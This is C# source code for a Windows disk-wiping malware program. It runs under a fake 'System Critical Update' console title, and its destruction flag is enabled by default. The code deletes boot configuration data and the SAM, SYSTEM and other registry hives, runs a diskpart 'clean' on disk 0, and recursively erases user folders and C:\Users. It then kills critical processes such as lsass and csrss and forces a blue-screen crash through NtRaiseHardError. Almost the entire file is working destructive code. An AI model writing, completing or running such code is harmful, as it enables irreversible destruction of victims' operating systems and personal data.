using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Security.Principal;

namespace Wiper
{
    class Program
    {
        // === CONFIGURATION ===
        private static bool _enableDestruction = true; // Set to true to activate
        private static string _logFile = "destruction_log.txt";

        // Windows API imports for BSOD
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        const int SE_SHUTDOWN_PRIVILEGE = 19;

        static void Main(string[] args)
        {
            Console.Title = "System Critical Update";
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n==========================================");
            Console.WriteLine("!!! CRITICAL SYSTEM PROCESS STARTED !!!");
            Console.WriteLine("==========================================\n");

            InitializeLog();

            // Check if running as admin
            bool isAdmin = IsAdministrator();
            Console.WriteLine($"[INFO] Running as Administrator: {isAdmin}");
            WriteLog($"Admin Status: {isAdmin}");

            if (!isAdmin)
            {
                Console.WriteLine("[ERROR] This payload requires Administrator privileges.");
                Console.WriteLine("Press Enter to exit...");
                Console.ReadLine();
                return;
            }

            int totalDestroyed = 0;

            // Phase 1: Destroy Boot Configuration Data (BCD)
            Console.WriteLine("\n[Phase 1] Corrupting Boot Configuration...\n");
            if (CorruptBootConfiguration())
                totalDestroyed++;

            // Phase 2: Destroy critical registry hives
            Console.WriteLine("\n[Phase 2] Corrupting Registry Hives...\n");
            totalDestroyed += CorruptRegistryHives();

            // Phase 3: Overwrite MBR/GPT
            Console.WriteLine("\n[Phase 3] Corrupting Disk Structures...\n");
            if (CorruptDiskStructures())
                totalDestroyed++;

            // Phase 4: Destroy user data
            Console.WriteLine("\n[Phase 4] Destroying User Data...\n");
            totalDestroyed += DestroyUserData();

            // Phase 5: Kill critical system processes
            Console.WriteLine("\n[Phase 5] Terminating Critical Processes...\n");
            totalDestroyed += KillCriticalProcesses();

            string summary = $"\n=== OPERATION SUMMARY ===\n" +
                           $"Destruction operations completed: {totalDestroyed}\n" +
                           $"Timestamp: {DateTime.Now}\n" +
                           $"Target: {Environment.MachineName}";
            Console.WriteLine(summary);
            WriteLog(summary);

            // Trigger BSOD if any destruction was successful
            if (totalDestroyed > 0 && _enableDestruction)
            {
                Console.WriteLine("\n[CRITICAL] System compromised. Triggering immediate crash...");
                WriteLog("[CRITICAL] Initiating BSOD...");
                Thread.Sleep(2000);
                TriggerBSOD();
            }
            else
            {
                Console.WriteLine("\n[SIMULATION MODE] No actual damage done.");
                Console.WriteLine($"Log saved: {Path.GetFullPath(_logFile)}");
                Console.WriteLine("\nPress Enter to exit...");
                Console.ReadLine();
            }
        }

        static bool IsAdministrator()
        {
            try
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }

        static void InitializeLog()
        {
            try
            {
                string logHeader = $"=== WIPER OPERATION LOG ===\n" +
                                 $"Start Time: {DateTime.Now}\n" +
                                 $"Target: {Environment.MachineName}\n" +
                                 $"OS: {Environment.OSVersion}\n" +
                                 $"User: {Environment.UserName}\n" +
                                 $"Mode: {(_enableDestruction ? "DESTRUCTION" : "SIMULATION")}\n\n";
                File.WriteAllText(_logFile, logHeader);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[WARNING] Log initialization failed: {ex.Message}");
            }
        }

        static void WriteLog(string message)
        {
            try
            {
                File.AppendAllText(_logFile, $"[{DateTime.Now:HH:mm:ss}] {message}\n");
            }
            catch { }
        }

        // Phase 1: Corrupt Boot Configuration Data
        static bool CorruptBootConfiguration()
        {
            try
            {
                if (_enableDestruction)
                {
                    Console.WriteLine("[!] Deleting Boot Configuration Data...");
                    WriteLog("[BCD] Attempting to delete BCD");

                    // Delete BCD store
                    var psi = new ProcessStartInfo
                    {
                        FileName = "bcdedit.exe",
                        Arguments = "/export C:\\bcd_backup",
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    };
                    Process.Start(psi)?.WaitForExit(5000);

                    // Delete all boot entries
                    var psi2 = new ProcessStartInfo
                    {
                        FileName = "bcdedit.exe",
                        Arguments = "/delete {bootmgr}",
                        CreateNoWindow = true,
                        UseShellExecute = false
                    };
                    var proc = Process.Start(psi2);
                    proc?.WaitForExit(5000);

                    // Also try to delete the BCD file directly
                    string bcdPath = @"C:\Boot\BCD";
                    if (File.Exists(bcdPath))
                    {
                        File.SetAttributes(bcdPath, FileAttributes.Normal);
                        File.Delete(bcdPath);
                    }

                    // Alternative BCD locations
                    string[] bcdPaths = {
                        @"C:\EFI\Microsoft\Boot\BCD",
                        @"C:\Boot\BCD"
                    };

                    foreach (var path in bcdPaths)
                    {
                        if (File.Exists(path))
                        {
                            try
                            {
                                File.SetAttributes(path, FileAttributes.Normal);
                                File.Delete(path);
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine($"[✓] Deleted: {path}");
                                Console.ForegroundColor = ConsoleColor.Red;
                                WriteLog($"[BCD] Deleted {path}");
                            }
                            catch { }
                        }
                    }

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[✓] Boot configuration corrupted");
                    Console.ForegroundColor = ConsoleColor.Red;
                    WriteLog("[BCD] Boot configuration destroyed");
                    return true;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("[SIM] Would corrupt boot configuration");
                    Console.ForegroundColor = ConsoleColor.Red;
                    WriteLog("[SIM] BCD corruption skipped");
                    return true;
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine($"[✗] BCD corruption failed: {ex.Message}");
                Console.ForegroundColor = ConsoleColor.Red;
                WriteLog($"[BCD ERROR] {ex.Message}");
                return false;
            }
        }

        // Phase 2: Corrupt Registry Hives
        static int CorruptRegistryHives()
        {
            int successCount = 0;
            string[] registryHives = {
                @"C:\Windows\System32\config\SAM",
                @"C:\Windows\System32\config\SECURITY",
                @"C:\Windows\System32\config\SOFTWARE",
                @"C:\Windows\System32\config\SYSTEM",
                @"C:\Windows\System32\config\DEFAULT"
            };

            foreach (var hive in registryHives)
            {
                try
                {
                    if (_enableDestruction)
                    {
                        if (File.Exists(hive))
                        {
                            // Take ownership
                            ExecuteCommand("takeown", $"/f \"{hive}\"");
                            ExecuteCommand("icacls", $"\"{hive}\" /grant Administrators:F");

                            // Try to delete
                            File.SetAttributes(hive, FileAttributes.Normal);
                            File.Delete(hive);

                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"[✓] Deleted: {Path.GetFileName(hive)}");
                            Console.ForegroundColor = ConsoleColor.Red;
                            WriteLog($"[REGISTRY] Deleted {hive}");
                            successCount++;
                        }
                        else
                        {
                            // File is in use - overwrite it
                            try
                            {
                                byte[] garbage = new byte[1024];
                                new Random().NextBytes(garbage);
                                File.WriteAllBytes(hive, garbage);

                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine($"[✓] Corrupted: {Path.GetFileName(hive)}");
                                Console.ForegroundColor = ConsoleColor.Red;
                                successCount++;
                            }
                            catch
                            {
                                Console.ForegroundColor = ConsoleColor.Yellow;
                                Console.WriteLine($"[!] Could not access: {Path.GetFileName(hive)} (file in use)");
                                Console.ForegroundColor = ConsoleColor.Red;
                            }
                        }
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"[SIM] Would delete: {Path.GetFileName(hive)}");
                        Console.ForegroundColor = ConsoleColor.Red;
                        successCount++;
                    }
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.WriteLine($"[✗] Failed: {Path.GetFileName(hive)} - {ex.Message}");
                    Console.ForegroundColor = ConsoleColor.Red;
                }
            }

            WriteLog($"[REGISTRY] Destroyed {successCount}/5 hives");
            return successCount;
        }

        // Phase 3: Corrupt Disk Structures
        static bool CorruptDiskStructures()
        {
            try
            {
                if (_enableDestruction)
                {
                    Console.WriteLine("[!] Attempting to wipe disk partition table...");
                    WriteLog("[DISK] Attempting disk wipe");

                    // Create diskpart script to clean disk
                    string diskpartScript = "select disk 0\nclean\nexit";
                    string scriptPath = Path.Combine(Path.GetTempPath(), "diskpart_script.txt");
                    File.WriteAllText(scriptPath, diskpartScript);

                    var psi = new ProcessStartInfo
                    {
                        FileName = "diskpart.exe",
                        Arguments = $"/s \"{scriptPath}\"",
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        Verb = "runas"
                    };

                    var proc = Process.Start(psi);
                    proc?.WaitForExit(15000);

                    try { File.Delete(scriptPath); } catch { }

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[✓] Disk structure corruption attempted");
                    Console.ForegroundColor = ConsoleColor.Red;
                    WriteLog("[DISK] Disk wipe executed");
                    return true;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("[SIM] Would wipe disk partition table");
                    Console.ForegroundColor = ConsoleColor.Red;
                    WriteLog("[SIM] Disk wipe skipped");
                    return true;
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine($"[✗] Disk corruption failed: {ex.Message}");
                Console.ForegroundColor = ConsoleColor.Red;
                WriteLog($"[DISK ERROR] {ex.Message}");
                return false;
            }
        }

        // Phase 4: Destroy User Data
        static int DestroyUserData()
        {
            int successCount = 0;
            string[] targetPaths = {
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
                @"C:\Users"
            };

            foreach (var path in targetPaths)
            {
                try
                {
                    if (Directory.Exists(path))
                    {
                        if (_enableDestruction)
                        {
                            Console.WriteLine($"[!] Destroying: {path}");
                            WriteLog($"[DATA] Destroying {path}");

                            // Recursively delete with force
                            DeleteDirectoryRecursive(path);

                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"[✓] Destroyed: {path}");
                            Console.ForegroundColor = ConsoleColor.Red;
                            successCount++;
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Cyan;
                            Console.WriteLine($"[SIM] Would delete: {path}");
                            Console.ForegroundColor = ConsoleColor.Red;
                            successCount++;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.WriteLine($"[✗] Partial destruction: {path} - {ex.Message}");
                    Console.ForegroundColor = ConsoleColor.Red;
                }
            }

            WriteLog($"[DATA] Destroyed {successCount} data directories");
            return successCount;
        }

        static void DeleteDirectoryRecursive(string path)
        {
            try
            {
                foreach (string file in Directory.GetFiles(path))
                {
                    try
                    {
                        File.SetAttributes(file, FileAttributes.Normal);
                        File.Delete(file);
                    }
                    catch { }
                }

                foreach (string dir in Directory.GetDirectories(path))
                {
                    try
                    {
                        DeleteDirectoryRecursive(dir);
                    }
                    catch { }
                }

                try
                {
                    Directory.Delete(path, false);
                }
                catch { }
            }
            catch { }
        }

        // Phase 5: Kill Critical Processes
        static int KillCriticalProcesses()
        {
            int successCount = 0;
            string[] criticalProcesses = { "csrss", "smss", "wininit", "services", "lsass", "winlogon" };

            foreach (var procName in criticalProcesses)
            {
                try
                {
                    if (_enableDestruction)
                    {
                        Console.WriteLine($"[!] Terminating: {procName}.exe");

                        var psi = new ProcessStartInfo
                        {
                            FileName = "taskkill.exe",
                            Arguments = $"/f /im {procName}.exe",
                            CreateNoWindow = true,
                            UseShellExecute = false,
                            RedirectStandardOutput = true
                        };

                        var proc = Process.Start(psi);
                        proc?.WaitForExit(3000);

                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"[✓] Terminated: {procName}.exe");
                        Console.ForegroundColor = ConsoleColor.Red;
                        WriteLog($"[PROCESS] Killed {procName}.exe");
                        successCount++;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"[SIM] Would kill: {procName}.exe");
                        Console.ForegroundColor = ConsoleColor.Red;
                        successCount++;
                    }
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.WriteLine($"[✗] Failed to kill: {procName}.exe - {ex.Message}");
                    Console.ForegroundColor = ConsoleColor.Red;
                }
            }

            return successCount;
        }

        static void ExecuteCommand(string fileName, string arguments)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = fileName,
                    Arguments = arguments,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                var proc = Process.Start(psi);
                proc?.WaitForExit(5000);
            }
            catch { }
        }

        static void TriggerBSOD()
        {
            try
            {
                Console.WriteLine("\n[FINAL] Triggering Blue Screen of Death...");
                WriteLog("[BSOD] Initiating system crash");

                // Method 1: NtRaiseHardError
                bool previousValue;
                uint result = RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, true, false, out previousValue);

                if (result == 0) // STATUS_SUCCESS
                {
                    uint response;
                    NtRaiseHardError(0xDEADDEAD, 0, 0, IntPtr.Zero, 6, out response);
                }

                // If we reach here, Method 1 failed
                Console.WriteLine("[!] Primary BSOD method failed, trying alternatives...");

                // Method 2: Kill csrss.exe (Client/Server Runtime Subsystem)
                Process.Start(new ProcessStartInfo
                {
                    FileName = "taskkill.exe",
                    Arguments = "/f /im csrss.exe",
                    CreateNoWindow = true,
                    UseShellExecute = false
                })?.WaitForExit();

                // Method 3: Immediate forced shutdown
                Process.Start(new ProcessStartInfo
                {
                    FileName = "shutdown.exe",
                    Arguments = "/s /f /t 0",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[✗] All crash methods failed: {ex.Message}");
                WriteLog($"[BSOD ERROR] {ex.Message}");
                Console.WriteLine("\nSystem may still be operational. Press Enter to exit...");
                Console.ReadLine();
            }
        }
    }
}